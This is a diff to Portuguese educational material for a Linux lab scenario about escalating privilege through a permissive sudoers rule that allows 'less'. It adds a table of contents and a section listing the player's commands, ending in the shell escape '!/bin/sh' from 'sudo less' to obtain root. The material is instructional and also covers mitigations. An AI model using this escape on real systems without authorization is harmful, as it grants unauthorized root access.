@@ -1,4 +1,71 @@
-# Material Didático — Cenário 1: Sudo with Less
+# Material Didático ― Cenário 1: Sudo with Less
+
+## Sumário
+
+- [Material Didático ― Cenário 1: Sudo with Less](#material-didático--cenário-1-sudo-with-less)
+  - [Sumário](#sumário)
+  - [1. Visão geral do cenário](#1-visão-geral-do-cenário)
+  - [2. Conceitos fundamentais de Linux](#2-conceitos-fundamentais-de-linux)
+    - [2.1 Usuários no Linux](#21-usuários-no-linux)
+    - [2.2 O usuário `root`](#22-o-usuário-root)
+    - [2.3 Shell](#23-shell)
+  - [3. Conceitos de permissões no Linux](#3-conceitos-de-permissões-no-linux)
+    - [3.1 Permissões de arquivos](#31-permissões-de-arquivos)
+    - [3.2 Arquivos importantes para usuários](#32-arquivos-importantes-para-usuários)
+  - [4. O que é `sudo`](#4-o-que-é-sudo)
+    - [4.1 Ideia geral](#41-ideia-geral)
+    - [4.2 Por que `sudo` existe?](#42-por-que-sudo-existe)
+    - [4.3 O comando `sudo -l`](#43-o-comando-sudo--l)
+  - [5. O arquivo `sudoers`](#5-o-arquivo-sudoers)
+    - [5.1 O que é o `sudoers`](#51-o-que-é-o-sudoers)
+    - [5.2 Entendendo a regra vulnerável](#52-entendendo-a-regra-vulnerável)
+      - [`bob`](#bob)
+      - [`ALL`](#all)
+      - [`(ALL)`](#all-1)
+      - [`NOPASSWD:`](#nopasswd)
+      - [`/usr/bin/less`](#usrbinless)
+    - [5.3 Por que essa regra é perigosa?](#53-por-que-essa-regra-é-perigosa)
+  - [6. Programas interativos e risco de segurança](#6-programas-interativos-e-risco-de-segurança)
+    - [6.1 O que são programas interativos?](#61-o-que-são-programas-interativos)
+    - [6.2 O princípio do menor privilégio](#62-o-princípio-do-menor-privilégio)
+  - [7. O que é o `less`](#7-o-que-é-o-less)
+    - [7.1 Função normal do `less`](#71-função-normal-do-less)
+    - [7.2 Por que o `less` é usado em administração?](#72-por-que-o-less-é-usado-em-administração)
+    - [7.3 O recurso perigoso: executar comandos](#73-o-recurso-perigoso-executar-comandos)
+  - [8. Shell escape](#8-shell-escape)
+    - [8.1 Definição](#81-definição)
+    - [8.2 Por que isso funciona?](#82-por-que-isso-funciona)
+  - [9. Escalonamento de privilégio](#9-escalonamento-de-privilégio)
+    - [9.1 O que é escalonamento de privilégio?](#91-o-que-é-escalonamento-de-privilégio)
+    - [9.2 Escalonamento local](#92-escalonamento-local)
+  - [10. Enumeração local](#10-enumeração-local)
+    - [10.1 O que é enumeração?](#101-o-que-é-enumeração)
+    - [10.2 Comandos úteis para este cenário](#102-comandos-úteis-para-este-cenário)
+  - [11. Fluxo conceitual do ataque no cenário](#11-fluxo-conceitual-do-ataque-no-cenário)
+  - [12. O papel do Docker no cenário](#12-o-papel-do-docker-no-cenário)
+    - [12.1 Por que usar Docker?](#121-por-que-usar-docker)
+    - [12.2 Container como ambiente de laboratório](#122-container-como-ambiente-de-laboratório)
+    - [12.3 SSH no cenário](#123-ssh-no-cenário)
+  - [13. Impacto da vulnerabilidade](#13-impacto-da-vulnerabilidade)
+  - [14. Como corrigir ou evitar essa falha](#14-como-corrigir-ou-evitar-essa-falha)
+    - [14.1 Não permitir programas interativos perigosos via sudo](#141-não-permitir-programas-interativos-perigosos-via-sudo)
+    - [14.2 Restringir comandos de forma específica](#142-restringir-comandos-de-forma-específica)
+    - [14.3 Evitar `NOPASSWD` sem necessidade](#143-evitar-nopasswd-sem-necessidade)
+    - [14.4 Usar `visudo`](#144-usar-visudo)
+    - [14.5 Considerar modos restritivos](#145-considerar-modos-restritivos)
+  - [15. Termos importantes](#15-termos-importantes)
+    - [`root`](#root)
+    - [`sudo`](#sudo)
+    - [`sudoers`](#sudoers)
+    - [`NOPASSWD`](#nopasswd-1)
+    - [`less`](#less)
+    - [Shell](#shell)
+    - [Shell escape](#shell-escape)
+    - [Escalonamento de privilégio](#escalonamento-de-privilégio)
+    - [Enumeração](#enumeração)
+  - [16. Perguntas para fixação](#16-perguntas-para-fixação)
+  - [17. Resumo final](#17-resumo-final)
+  - [18. Comandos utilizados pelo jogador](#18-comandos-utilizados-pelo-jogador)
 
 ## 1. Visão geral do cenário
 
@@ -808,3 +875,45 @@ Assim, o jogador aprende que:
 - uma regra pequena no `sudoers` pode ter impacto crítico.
 
 O aprendizado principal do laboratório é que segurança não depende apenas de impedir exploits complexos. Muitas vezes, o problema está em permissões excessivas, configurações descuidadas e falta de compreensão sobre o comportamento dos programas permitidos.
+
+---
+
+## 18. Comandos utilizados pelo jogador
+
+Resumo dos principais comandos usados pelo jogador para enumerar a máquina, identificar a falha e obter privilégios administrativos.
+
+```bash
+# Verificar usuário atual
+whoami
+```
+
+```bash
+# Verificar UID, GID e grupos do usuário
+id
+```
+
+```bash
+# Listar permissões sudo disponíveis para o usuário atual
+sudo -l
+```
+
+```bash
+# Executar o less com privilégios elevados
+sudo less /etc/hosts
+```
+
+```bash
+# Dentro do less, escapar para um shell
+!/bin/sh
+```
+
+```bash
+# Confirmar se o shell obtido é root
+whoami
+id
+```
+
+```bash
+# Sair do shell privilegiado
+exit
+```
